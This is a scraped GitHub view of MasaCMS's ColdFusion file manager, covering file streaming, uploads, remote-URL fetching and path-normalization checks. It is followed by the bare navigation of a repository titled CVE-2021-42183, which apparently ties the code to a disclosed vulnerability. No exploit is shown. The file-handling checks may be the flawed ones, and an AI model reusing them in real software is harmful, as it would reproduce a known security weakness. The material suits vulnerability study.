 <cfif listFindNoCase('png,jpg,jpeg,gif',rsFileData.fileExt) and len(arguments.size)> <cfset theFileLocation="#variables.configBean.getFileDir()#/#rsFileData.siteid#/cache/file/#arguments.fileID#\_#arguments.size#.#rsFileData.fileExt#" /> <cfif not fileExists(theFileLocation)> <cfset cropAndScale(fileid=arguments.fileID,size=arguments.size,siteid=rsFileData.siteid)> </cfif> <cfelse> <cfset theFileLocation="#variables.configBean.getFileDir()#/#rsFileData.siteid#/cache/file/#arguments.fileID#.#rsFileData.fileExt#" /> </cfif>
 <cfset streamFile(theFileLocation,rsfileData.filename,"#rsfileData.contentType#/#rsfileData.contentSubType#",arguments.method,rsfileData.created)> <cfset pluginManager.announceEvent("onAfterFileRender",pluginEvent)> </cfcase> <cfcase value="S3"> <cfset rsFileData=readMeta(arguments.fileid) /> <cfif not rsFileData.recordcount> <cfset getBean("contentServer").render404()> </cfif> <cfset arguments.siteID=rsFileData.siteid> <cfset arguments.rsFile=rsFileData> <cfset pluginEvent.init(arguments)> <cfset pluginManager.announceEvent("onBeforeFileRender",pluginEvent)> <cfset renderS3(fileid=arguments.fileid,method=arguments.method,size="normal") /> <cfset pluginManager.announceEvent("onAfterFileRender",pluginEvent)> </cfcase> </cfswitch>
</cffunction>
<cffunction name="renderSmall" output="true"><cfargument name="fileID" type="string"><cfargument name="method" type="string" required="true" default="inline">
 <cfset var rsFile="" /> <cfset var theFile="" /> <cfset var theFileLocation="" /> <cfset var fileCheck="" />
 <cfif not isValid("UUID",arguments.fileID)> <cfset getBean("contentServer").render404()> </cfif>
 <cfswitch expression="#variables.configBean.getFileStore()#"> <cfcase value="database"> <cfset rsFile=readSmall(arguments.fileid) /> <cfif not rsFile.recordcount> <cfset getBean("contentServer").render404()> </cfif> <cfheader name="Content-Disposition" value='#arguments.method#;filename="#rsfile.filename#"'> <cfheader name="Content-Length" value="#arrayLen(rsFile.imageSmall)#"> <cfif variables.configBean.getCompiler() eq 'Adobe'> <cfset createObject("component","mura.content.file.renderAdobe").init("#rsfile.contentType#/#rsfile.contentSubType#",rsFile.imageSmall)> <cfelse> <cfset createObject("component","mura.content.file.renderLucee").init("#rsfile.contentType#/#rsfile.contentSubType#",rsFile.imageSmall)> </cfif> </cfcase> <cfcase value="filedir"> <cfset rsFile=readMeta(arguments.fileid) /> <cfif not rsFile.recordcount> <cfset getBean("contentServer").render404()> </cfif> <cfset theFileLocation="#variables.configBean.getFileDir()#/#rsFile.siteid#/cache/file/#arguments.fileID#\_small.#rsFile.fileExt#" /> <cfset streamFile(theFileLocation,rsFile.filename,"#rsFile.contentType#/#rsFile.contentSubType#",arguments.method,rsFile.created)> </cfcase> <cfcase value="S3"> <cfset renderS3(fileid=arguments.fileid,method=arguments.method,size="\_small") /> </cfcase> </cfswitch>
</cffunction>
<cffunction name="renderMedium" output="true"><cfargument name="fileID" type="string"><cfargument name="method" type="string" required="true" default="inline">
 <cfset var rsFile="" /> <cfset var theFile="" /> <cfset var theFileLocation="" /> <cfset var fileCheck="" />
 <cfif not isValid("UUID",arguments.fileID)> <cfset getBean("contentServer").render404()> </cfif>
 <cfswitch expression="#variables.configBean.getFileStore()#"> <cfcase value="database"> <cfset rsFile=readMedium(arguments.fileid) /> <cfif not rsFile.recordcount> <cfset getBean("contentServer").render404()> </cfif> <cfheader name="Content-Disposition" value='#arguments.method#;filename="#rsfile.filename#"'> <cfheader name="Content-Length" value="#arrayLen(rsFile.imageMedium)#"> <cfif variables.configBean.getCompiler() eq 'Adobe'> <cfset createObject("component","mura.content.file.renderAdobe").init("#rsfile.contentType#/#rsfile.contentSubType#",rsFile.imageMedium)> <cfelse> <cfset createObject("component","mura.content.file.renderLucee").init("#rsfile.contentType#/#rsfile.contentSubType#",rsFile.imageMedium)> </cfif> </cfcase> <cfcase value="filedir"> <cfset rsFile=readMeta(arguments.fileid) /> <cfif not rsFile.recordcount> <cfset getBean("contentServer").render404()> </cfif> <cfset theFileLocation="#variables.configBean.getFileDir()#/#rsFile.siteid#/cache/file/#arguments.fileID#\_medium.#rsFile.fileExt#" /> <cfset streamFile(theFileLocation,rsFile.filename,"#rsFile.contentType#/#rsFile.contentSubType#",arguments.method,rsFile.created)> </cfcase> <cfcase value="S3"> <cfset renderS3(fileid=arguments.fileid,method=arguments.method,size="\_medium") /> </cfcase> </cfswitch>
</cffunction>
<cffunction name="uploadAsset" output="false"> <cfargument name="formField" type="string"> <cfargument name="siteId" type="string"> <cfargument name="folder" type="string">
 <cftry> <cfset var destFilePath = "/#arguments.siteId##arguments.folder#"/> <cffile action="upload" filefield="#arguments.formField#" destination="#variables.configBean.getFileDir()#/#destFilePath#" nameconflict="MAKEUNIQUE" /> <cfset var destFileName = "#createUUID()#-#cffile.serverFile#"/>
 <cffile action="rename" source="#variables.configBean.getFileDir()#/#destFilePath#/#cffile.serverFile#" destination="#variables.configBean.getFileDir()#/#destFilePath#/#destFileName#"> <cfset var filePath = "#application.configBean.getContext()#/index.cfm/\_api/asset/image/?filePath=#destFilePath#/#destFileName#"> <cfset var data = {"fileName":"#destFileName#","url":"#filePath#","uploaded":1} />
 <cfcatch> <cfset var data = {"fileName":"","url":"","uploaded":0} /> </cfcatch> </cftry> <cfheader name="Content-Type" value="application/json;charset=UTF-8" /> <cfreturn serializeJSON(data) /></cffunction>
<cffunction name="renderAsset" output="true"> <cfargument name="filePath" type="string"> <cfargument name="method" type="string">
 <cfset var fileLocation = "#variables.configBean.getFileDir()##arguments.filePath#">
 <!--- detect url tempering by checking the normalized path eq the configured path ---> <cfif fileLocation NEQ this.normalizePath(variables.configBean.getFileDir(), filePath)> <!--- return 404 so we don't leak information ---> <cfset getBean("contentServer").render404()> </cfif>
 <cfset var asset = { fileLocation = fileLocation, filename = getFileFromPath(arguments.filePath), mimeType = FileGetMimeType(arguments.filePath), dateModified = now() } />
 <cfset streamFile(asset.fileLocation, asset.filename, asset.mimeType, arguments.method, asset.dateModified, false, true)></cffunction>
<cffunction name="normalizePath" output="false"> <cfargument name="prefix" type="string"> <cfargument name="path" type="string">
 <cfset var pathArray = arrayNew(1)> <cfset arrayAppend(pathArray, arguments.path)> <cfreturn CreateObject("java", "java.nio.file.Paths").get(prefix, pathArray).normalize().toString()></cffunction>
<cffunction name="renderMimeType" output="true" hint="deprecated in favor of streamFile"><cfargument name="mimeType" default="" required="yes" type="string"><cfargument name="file" default="" required="yes" type="any">
<cfswitch expression="#variables.configBean.getCompiler()#"> <cfcase value="adobe"> <cfset createObject("component","mura.content.file.renderAdobe").init(arguments.mimeType,arguments.file) /> </cfcase> <cfdefaultcase> <cfset createObject("component","mura.content.file.renderLucee").init(arguments.mimeType,arguments.file) /> </cfdefaultcase></cfswitch></cffunction>
<cffunction name="Process" returnType="struct"><cfargument name="file"><cfargument name="siteID">
 <cfset var fileStruct=variables.imageProcessor.process(arguments.file,arguments.siteID) />
 <cfif not structKeyExists(fileStruct,"fileObjSource")> <cfset fileStruct.fileObjSource=""> </cfif>
 <cfreturn fileStruct></cffunction>
<cffunction name="renderS3" output="true"> <cfargument name="fileid" type="string" required="true" /> <cfargument name="method" type="string" required="false" default="inline" /> <cfargument name="size" type="string" required="false" default="" /> <cfargument name="bucket" type="string" required="false" default="#variables.bucket#" /> <cfargument name="debug" type="boolean" required="false" default="false" />
 <cfscript> var local = structNew(); local.rsFile = readMeta(arguments.fileid); local.theFile = structNew(); local.sizeList = "\_small^\_medium"; local.methodList = "inline^attachment";
 if ( not listFindNoCase(local.sizeList, arguments.size, "^") ) { local.size = ""; } else { local.size = arguments.size; };
 if ( not listFindNoCase(local.methodList, arguments.method, "^") ) { local.method = "inline"; } else { local.method = arguments.method; }; </cfscript> <cftry> <cfset var theURL="http://" & "#variables.configBean.getFileStoreEndPoint()#/#arguments.bucket#/#local.rsFile.siteid#/cache/file/#arguments.fileid##local.size#.#local.rsFile.fileExt#"> <cfhttp attributeCollection='#getHTTPAttrs( getasbinary="yes", result="local.theFile", method="get", url=theURL)#'> <cfcatch> </cfcatch> </cftry> <cfif arguments.debug> <cfdump var="#local#" label="fileManager.renderS3().local" /> <cfabort /> </cfif> <cfif structKeyExists(local.rsFile, "filename")> <cfheader name="Content-Disposition" value="#local.method#;filename=""#local.rsFile.filename#""" /> </cfif> <cfif structKeyExists(local.theFile, "fileContent") and isArray(local.theFile.fileContent)> <cfheader name="Content-Length" value="#arrayLen(local.theFile.fileContent)#" /> <cfif structKeyExists(local.rsFile, "contentType") and structKeyExists(local.rsFile, "contentSubType")> <cfif variables.configBean.getCompiler() eq 'adobe'> <cfset createObject("component","mura.content.file.renderAdobe").init("#local.rsFile.contentType#/#local.rsFile.contentSubType#",local.theFile.fileContent) /> <cfelse> <cfset createObject("component","mura.content.file.renderLucee").init("#local.rsFile.contentType#/#local.rsFile.contentSubType#",local.theFile.fileContent) /> </cfif> </cfif> </cfif></cffunction>
<cffunction name="upload" output="false"> <cfargument name="fileField">
 <cffile action="upload" result="local.results" filefield="#arguments.fileField#" nameconflict="makeunique" destination="#variables.configBean.getTempDir()#">
 <cfif listFindNoCase('jpg,jpeg',local.results.clientFileExt)> <cftry> <cfimage source="#local.results.serverDirectory#/#local.results.serverFile#" name="local.imageObj"> <cfset local.results.exif=ImageGetEXIFMetadata(local.imageObj)> <cfcatch> <cfset local.results.exif={}> </cfcatch> </cftry> <cfelse> <cfset local.results.exif={}> </cfif> <cfreturn local.results></cffunction>
<cffunction name="allowMetaData" output="false"> <cfargument name="metadata"> <cfreturn \_allowMetaData(metadata)></cffunction>
<cffunction name="\_allowMetaData" output="false"> <cfargument name="metadata"> <cfset var key=""> <cfloop collection="#arguments.metadata#" item="key"> <cfif isSimpleValue(key)> <cfif isStruct(arguments.metadata['#key#']) and not allowMetaData(arguments.metadata['#key#'])> <cfreturn false> <cfelseif isSimpleValue(arguments.metadata['#key#']) and (findNoCase('<cf',arguments.metadata['#key#']) or findNoCase('</cf',arguments.metadata['#key#']))> <cfreturn false> </cfif> <cfelseif isStruct(key) and not allowMetaData(key)> <cfreturn false> </cfif> </cfloop> <cfreturn true></cffunction>
<cffunction name="emulateUpload" output="false"> <cfargument name="filePath" type="string" required="true" /> <cfargument name="destinationDir" type="string" required="true" default="#variables.configBean.getTempDir()#"/> <cfset var local = structNew() />
 <!--- create a URLconnection to the file to emulate uploading ---> <cfset local.filePath=replace(arguments.filePath,"\","/","all")> <cfset local.results=structNew()>
 <cfif not find("://",local.filePath)> <cfset local.isLocalFile=true> <cfset local.filePath=replaceNoCase(local.filePath,"file:///","")> <cfset local.filePath=replaceNoCase(local.filePath,"file://","")>
 <cfif not fileExists(local.filePath)> <cfreturn {}> </cfif>
 <cfif application.CFVersion gte 10> <cfset local.getFileType = fileGetMimeType(local.filePath,false)> <cfset local.getFileInfo = getFileInfo(local.filePath) >
 <cfset local.results.contentType=listFirst(local.getFileType ,"/")> <cfset local.results.contentSubType=listLast(local.getFileType ,"/")> <cfset local.results.fileSize=local.getFileInfo.size>
 <cfelse> <cfif not findNoCase("windows",server.os.name)> <cfset local.connection=createObject("java","java.net.URL").init("file://" & local.filePath).openConnection()> <cfelse> <cfset local.connection=createObject("java","java.net.URL").init("file:///" & local.filePath).openConnection()> </cfif>
 <cfset local.connection.connect()> <cfset local.results.contentType=listFirst(local.connection.getContentType() ,"/")> <cfset local.results.contentSubType=listLast(local.connection.getContentType() ,"/")> <!---<cfset local.results.charSet=local.connection.getContentEncoding()>---> <cfset local.results.fileSize=local.connection.getContentLength()> <cfset local.connection.getInputStream().close()> <!---<cffile action="readBinary" file="#local.filePath#" variable="local.fileContent">---> </cfif>
 <cfelse> <cfset local.isLocalFile=false>
 <cfhttp attributeCollection='#getHTTPAttrs( url="#local.filePath#", result="local.remoteGet", getasbinary="yes")#'> <cfhttpparam type="header" name="accept-encoding" value="no-compression" /> </cfhttp>
 <cfset local.results.contentType=listFirst(local.remoteGet.mimeType ,"/")> <cfset local.results.contentSubType=listLast(local.remoteGet.mimeType ,"/")> <cfset local.results.fileSize=len(local.remoteGet.fileContent)> <!---<cfset local.fileContent=local.remoteGet.fileContent>--->
 </cfif>
 <cfset local.results.serverFileExt=listLast(local.filePath ,".")> <cfset local.results.serverDirectory=arguments.destinationDir> <cfset local.results.serverFile=replace(listLast(local.filePath ,"/")," ","-","all")> <cfset local.results.clientFile=local.results.serverFile> <cfset local.results.serverFileName=listDeleteAt(local.results.serverFile,listLen(local.results.serverFile ,"."),".")> <cfset local.results.clientFileName=listDeleteAt(local.results.clientFile,listLen(local.results.clientFile ,"."),".")> <cfset local.results.clientFileExt=listLast(local.filePath ,".")>
 <cfif listFind("/,\",right(local.results.serverDirectory,1))> <cfset local.results.serverDirectory=left(local.results.serverDirectory, len(local.results.serverDirectory)-1 )> </cfif>
 <cfset local.fileuploaded=false> <cfset local.filecreateattempt=1> <cfloop condition="not local.fileuploaded"> <cfif not fileExists("#local.results.serverDirectory#/#local.results.serverFile#")> <cfif local.isLocalFile> <cfif listFindNoCase('jpg,jpeg',local.results.clientFileExt)> <cftry> <cfimage source="#local.filePath#" name="local.imageObj"> <cfset local.results.exif=ImageGetEXIFMetadata(local.imageObj)> <cfcatch> <cfset local.results.exif={}> </cfcatch> </cftry> <cfelse> <cfset local.results.exif={}> </cfif> <cffile action="copy" destination="#local.results.serverDirectory#/#local.results.serverFile#" source="#local.filePath#" > <cfelse> <cffile action="write" file="#local.results.serverDirectory#/#local.results.serverFile#" output="#local.remoteGet.fileContent#" > <cfif listFindNoCase('jpg,jpeg',local.results.clientFileExt)> <cftry> <cfimage source="#local.results.serverDirectory#/#local.results.serverFile#" name="local.imageObj"> <cfset local.results.exif=ImageGetEXIFMetadata(local.imageObj)> <cfcatch> <cfset local.results.exif={}> </cfcatch> </cftry> <cfelse> <cfset local.results.exif={}> </cfif> </cfif> <cfset local.fileuploaded=true> <cfelse> <cfset local.results.serverFile=local.results.serverFileName & local.filecreateattempt & "." & local.results.serverFileExt> <cfset local.filecreateattempt=local.filecreateattempt+1> </cfif> </cfloop>
 <cfreturn local.results>
</cffunction>
<cffunction name="isPostedFile" output="false"> <cfargument name="fileField"> <cfreturn (structKeyExists(form,arguments.fileField) and listFindNoCase("tmp,upload",listLast(form['#arguments.fileField#'],"."))) or listFindNoCase("tmp,upload",listLast(arguments.fileField,"."))></cffunction>
<cffunction name="requestHasRestrictedFiles" output="false"> <cfargument name="scope" default="#form#"> <cfargument name="allowedExtensions" default="#getBean('configBean').getFMAllowedExtensions()#"> <cfscript> var tempext=''; var classExtensionManager=getBean('configBean').getClassExtensionManager();
 if(!len(arguments.allowedExtensions)){ return false; }
 if(structKeyExists(arguments.scope,'siteid')){ var siteid=arguments.scope.siteid; } else { var siteid=getSession().siteid; }
 if(isdefined('arguments.scope.type') && arguments.scope.type=='Link'){ arguments.scope=structCopy(arguments.scope); structDelete(arguments.scope,'body'); }
 for (var i in arguments.scope){ if(structKeyExists(arguments.scope,'#i#') && isSimpleValue(arguments.scope['#i#']) ){ if(isPostedFile(i)){
 temptext=listLast(getPostedClientFileName(i),'.');
 if(len(tempText) && len(tempText) < 5 && !listFindNoCase(arguments.allowedExtensions,temptext)){ return true; } }
 if(isValid('url',arguments.scope['#i#']) && right(arguments.scope['#i#'],1) != '/'){
 if(i neq 'newfile' && !classExtensionManager.isFileAttribute(i,siteid)){ break; }
 tempText=arguments.scope['#i#'];
 //if it contains a protocol if(reFindNoCase("(https://||http://)", tempText)){
 //strip it out tempText=reReplaceNoCase(tempText, "(http://||https://)", "");
 //and then on continue if the url contains a list longer than one if(listLen(tempText,'/') ==1) { break; } }
 tempText=listFirst(arguments.scope['#i#'],'?'); tempText=listLast(tempText,'/'); tempText=listLast(tempText,'.');
 /\* if(i=='body'){ writeDump(var=tempText,abort=1); } \*/
 if(len(tempText) < 5 && !listFindNoCase(arguments.allowedExtensions,temptext)){ return true; } }
 } }
 return false; </cfscript></cffunction>
<cffunction name="getPostedClientFileName" output="false" hint=""> <cfargument name="fieldName" required="true" type="string" hint="Name of the Form field" /> <cftry> <cfif variables.configBean.getCompiler() eq 'Adobe'> <cfset var tmpPartsArray = Form.getPartsArray() />
 <cfif IsDefined("tmpPartsArray")> <cfloop array="#tmpPartsArray#" index="local.tmpPart"> <cfif local.tmpPart.isFile() AND local.tmpPart.getName() EQ arguments.fieldName> <cfreturn local.tmpPart.getFileName() /> </cfif> </cfloop> </cfif> <cfelse> <cfreturn GetPageContext().formScope().getUploadResource(arguments.fieldname).getName()> </cfif> <cfcatch> <cflog type="Error" file="exception" text="#cfcatch.type#: #cfcatch.detail#"> </cfcatch> </cftry>
 <cfreturn "" /></cffunction>
<cffunction name="purgeDeleted" output="false"> <cfargument name="siteid" default=""> <cfset arguments.siteid=variables.settingsManager.getSite(arguments.siteid).getFilePoolID()> <cfset variables.fileDAO.purgeDeleted(arguments.siteID)></cffunction>
<cffunction name="restoreVersion" output="false"> <cfargument name="fileID"> <cfset variables.fileDAO.restoreVersion(arguments.fileID)></cffunction>
<cffunction name="cleanFileCache" output="false"><cfargument name="siteID">
 <cfset arguments.siteid=variables.settingsManager.getSite(arguments.siteid).getFilePoolID()>
 <cfset var rsDB=""> <cfset var rsDIR=""> <cfset var rsCheck=""> <cfset var filePath="#application.configBean.getFileDir()#/#arguments.siteID#/cache/file/"> <cfset var check="">
 <!--- Allow function to be escaped for huge file directories ---> <cfif variables.configBean.getValue('skipCleanFileCache')> <cfreturn> </cfif>
 <cfquery attributeCollection="#variables.configBean.getReadOnlyQRYAttrs(name='rsDB')#"> select fileID from tfiles where siteID=<cfqueryparam cfsqltype="cf\_sql\_varchar" value="#arguments.siteID#"> </cfquery>
 <cfdirectory action="list" name="rsDIR" directory="#filePath#">
 <cfloop query="rsDir"> <cfif not find('.svn',#rsDir.name#)> <cfquery name="rsCheck" dbType="query"> select \* from rsDB where fileID=<cfqueryparam cfsqltype="cf\_sql\_varchar" value="#left(rsDIR.name,35)#"> </cfquery>
 <cfif not rsCheck.recordcount> <cffile action="delete" file="#filepath##rsDir.name#"> </cfif> </cfif> </cfloop>
 <cfdirectory action="list" name="rsDIR" directory="#filePath#">
 <cfquery name="rsCheck" dbType="query"> select \* from rsDIR where name like '%\\_H%' ESCAPE '\' </cfquery>
 <cfif rsCheck.recordcount> <cfloop query="rscheck"> <cfif listLen(rsCheck.name,"\_") gt 1> <cfset check=listGetAt(rsCheck.name,2,"\_")> <cfif len(check) gt 1> <cfset check=mid(check,2,1)> <cfif isNumeric(check)> <cffile action="delete" file="#filepath##rsCheck.name#"> </cfif> </cfif> </cfif> </cfloop> </cfif></cffunction>
<cffunction name="getImageFilesQuery" returntype="query" output="false" hint="Retrieves all image file data for a single site."> <cfargument name="siteID" type="string" required="true"> <cfargument name="fields" type="string" required="true" default="fileID, fileEXT">
 <cfset var rsDB="">
 <cfquery attributeCollection="#variables.configBean.getReadOnlyQRYAttrs(name='rsDB')#"> select #arguments.fields# from tfiles where siteID=<cfqueryparam cfsqltype="cf\_sql\_varchar" value="#arguments.siteID#"> and fileEXT in ('jpg','jpeg','png','gif') </cfquery>
 <cfreturn rsDB /></cffunction>
<cffunction name="deleteCustomImageCache" output="false" hint="Deletes custom cached images from the image cache based on age."><cfargument name="siteID"><cfargument name="threshold" type="numeric" default="1" hint="How old in days the image must be before it is removed.">
 <cfset var cacheFilePath=application.configBean.getFileDir() & "/" & arguments.siteID & "/cache/file/"> <cfset var check = ""> <cfset var rsDir=""> <cfset var rsCustomImages=""> <cfset var thresholdDate = dateAdd("d", -arguments.threshold, now())>
 <cfdirectory action="list" name="rsDIR" directory="#cacheFilePath#">
 <cfquery name="rsCustomImages" dbType="query"> select \* from rsDIR where name like '%\_H%' and dateLastModified < <cfqueryparam cfsqltype="cf\_sql\_timestamp" value="#thresholdDate#"> </cfquery>
 <cfloop query="rsCustomImages"> <cfif isNumeric(replaceNoCase(listGetAt(rsCustomImages.name, 2, "\_"), "w", "", "one"))> <cffile action="delete" file="#cacheFilePath##rsCustomImages.name#"> </cfif> </cfloop></cffunction>
<cffunction name="rebuildImageCache" output="false" hint="Rebuilds either the entire image cache or a specific image size for a single site."><cfargument name="siteID"><cfargument name="size" default="">
 <cfset arguments.siteid=variables.settingsManager.getSite(arguments.siteid).getFilePoolID()>
 <cfset var cacheFilePath=application.configBean.getFileDir() & "/" & arguments.siteID & "/cache/file/"> <cfset var currentSite=variables.settingsManager.getSite(arguments.siteID)> <cfset var currentSource=""> <cfset var imageSize=""> <cfset var rsDB=getImageFilesQuery(arguments.siteid)> <cfset var rsImageSizes=""> <cfset var sizeList=arguments.size>
 <!--- Size not provided, rebuild all image sizes for site. ---> <cfif not len(sizeList)> <cfset rsImageSizes=currentSite.getCustomImageSizeQuery()> <cfset sizeList=listAppend("small,medium,large", valueList(rsImageSizes.name))> </cfif>
 <!--- Determine source file and rebuild image file cache. ---> <cfloop query="rsDB"> <cfset currentSource=cacheFilePath & rsDB.fileID & "\_source." & rsDB.fileEXT>
 <!--- Source file is missing, use large file. ---> <cfif not fileExists(currentSource)> <cfset currentSource=cacheFilePath & rsDB.fileID & "." & rsDB.fileEXT> </cfif>
 <cfif fileExists(currentSource)> <cfloop list="#sizeList#" index="imageSize"> <cfset cropAndScale(fileID=rsDB.fileID,size=imageSize,siteid=arguments.siteid)> </cfloop> </cfif> </cfloop>
 <cfif not len(arguments.size)> <cfset deleteCustomImageCache(arguments.siteID)> </cfif></cffunction>
<cffunction name="streamFile" output="false"><cfargument name="filePath"><cfargument name="filename"><cfargument name="mimetype"><cfargument name="method" type="string" required="true" default="inline"><cfargument name="lastModified" required="true" default="#now()#"><cfargument name="deleteFile" type="boolean" required="true" default="false"><cfset var local=structNew()>
 <cfif findNoCase("video",arguments.mimetype)> <cfset arguments.method = "attachment"> </cfif>
 <cfif application.CFVersion gt 7> <cftry> <cfif structkeyexists(cgi, "http\_if\_modified\_since")> <cfif parsedatetime(cgi.http\_if\_modified\_since) gt arguments.lastModified> <cfheader statuscode=304 statustext="Not modified"/> <cfabort/> </cfif> </cfif>
 <cfheader name="Last-Modified" value="#gethttptimestring(arguments.lastModified)#"/> <cfcatch></cfcatch> </cftry>
 <cfheader name="Last-Modified" value="#gethttptimestring(arguments.lastModified)#"/>
 <cfset local.fileCheck = FileOpen(arguments.filepath, "readBinary")> <cfheader name="Content-Length" value="#listFirst(local.fileCheck.size,' ')#"> <cfset FileClose(local.fileCheck)> </cfif>
 <cfheader name="Content-Disposition" value='#arguments.method#;filename="#arguments.filename#"'> <cfcontent file="#arguments.filePath#" type="#arguments.mimetype#" deletefile="#arguments.deleteFile#">
</cffunction>
<cffunction name="getCustomImage"> <cfargument name="Image" required="true" /> <cfargument name="Height" default="AUTO" /> <cfargument name="Width" default="AUTO" /> <cfargument name="size" default="" /> <cfargument name="siteID" default="" />
 <cfset arguments.siteid=variables.settingsManager.getSite(arguments.siteid).getFilePoolID()>
 <cfreturn variables.imageProcessor.getCustomImage(argumentCollection=arguments) /></cffunction>
<cffunction name="createHREFForImage" output="false"><cfargument name="siteID"><cfargument name="fileID" default=""><cfargument name="fileExt" default=""><cfargument name="size" required="true" default="undefined"><cfargument name="direct" required="true" default="#this.directImages#"><cfargument name="complete" type="boolean" required="true" default="false"><cfargument name="height" default=""/><cfargument name="width" default=""/><cfargument name="secure" default="false"><cfargument name="useProtocol" default="true">
 <cfset var imgSuffix=""> <cfset var returnURL=""> <cfset var begin="">
 <cfif not len(arguments.fileid)> <cfset arguments.fileid=variables.settingsManager.getSite(arguments.siteid).getPlaceholderImgId()> <cfset arguments.fileExt=variables.settingsManager.getSite(arguments.siteid).getPlaceholderImgExt()> </cfif>
 <cfif not len(arguments.fileExt)> <cfset arguments.fileEXT=getBean("fileManager").readMeta(arguments.fileID).fileEXT> </cfif>
 <cfif not ListFindNoCase('jpg,jpeg,png,gif,svg', arguments.fileEXT)> <cfreturn ''> </cfif>
 <cfif not structKeyExists(arguments,"siteID")> <cfset var sessionData=getSession()> <cfset arguments.siteID=sessionData.siteID> </cfif>
 <cfset var site=variables.settingsManager.getSite(arguments.siteid)>
 <cfif isValid('URL', application.configBean.getAssetPath())> <cfset var begin=application.configBean.getAssetPath() & "/" & site.getFilePoolID()> <cfelse> <cfset var begin=site.getFileAssetPath(argumentCollection=arguments)> </cfif>
 <cfif request.muraExportHtml> <cfset arguments.direct=true> </cfif>
 <cfif arguments.direct and listFindNoCase("fileDir,s3",application.configBean.getFileStore())> <cfif arguments.fileEXT eq 'svg'> <cfset returnURL=begin & "/cache/file/" & arguments.fileID & "." & arguments.fileEXT> <cfelse> <cfif arguments.size eq 'undefined'>[View remainder of file in raw view](https://github.com/MasaCMS/MasaCMS/raw/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura/content/file/fileManager.cfc)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_1c8e9e0f_20250114_200126.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xRaw%2FCVE-2021-42183)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xRaw%2FCVE-2021-42183)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=0xRaw%2FCVE-2021-42183)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[0xRaw](/0xRaw)
/
**[CVE-2021-42183](/0xRaw/CVE-2021-42183)**
Public

* [Notifications](/login?return_to=%2F0xRaw%2FCVE-2021-42183) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2F0xRaw%2FCVE-2021-42183)
* [Star
   0](/login?return_to=%2F0xRaw%2FCVE-2021-42183)

[0
stars](/0xRaw/CVE-2021-42183/stargazers) [0
forks](/0xRaw/CVE-2021-42183/forks) [Branches](/0xRaw/CVE-2021-42183/branches) [Tags](/0xRaw/CVE-2021-42183/tags) [Activity](/0xRaw/CVE-2021-42183/activity)
 [Star](/login?return_to=%2F0xRaw%2FCVE-2021-42183)

 [Notifications](/login?return_to=%2F0xRaw%2FCVE-2021-42183) You must be signed in to change notification settings

* [Code](/0xRaw/CVE-2021-42183)
* [Issues
  0](/0xRaw/CVE-2021-42183/issues)
* [Pull requests
  0](/0xRaw/CVE-2021-42183/pulls)
* [Actions](/0xRaw/CVE-2021-42183/actions)
* [Projects
  0](/0xRaw/CVE-2021-42183/projects)
* [Security](/0xRaw/CVE-2021-42183/security)
